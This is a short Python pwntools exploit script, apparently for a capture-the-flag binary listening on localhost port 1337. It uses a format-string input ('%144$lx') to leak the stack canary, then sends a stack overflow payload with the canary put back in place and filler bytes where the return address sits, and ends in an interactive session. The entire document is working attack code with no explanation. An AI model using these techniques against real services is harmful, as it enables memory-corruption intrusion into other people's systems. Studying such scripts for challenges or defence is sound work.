from pwn import *

target = remote('127.0.0.1', 1337)


def clearMenu():
	print target.recvuntil("choice > ")

def canaryInfoLeak():
	target.sendline("2")
	print target.recvuntil("Your format > ")
	target.sendline("%144$lx")
	leak = target.recvline().replace("\n", "")
	leak = int(leak, 16)
	log.info("The infoleak is: " + hex(leak))
	target.sendline("")
	clearMenu()
	return leak

def smashStack(payload):
	target.sendline("1")
	print target.recvuntil("How much bytes you want to send ? ")
	length = str(len(payload) - 4)
	target.sendline(length)
	target.sendline(payload)


clearMenu()
raw_input()
stackCanary = canaryInfoLeak()

payload = "0"*1037 + p64(stackCanary) + "1"*8 + "2"*8

smashStack(payload)

target.interactive()
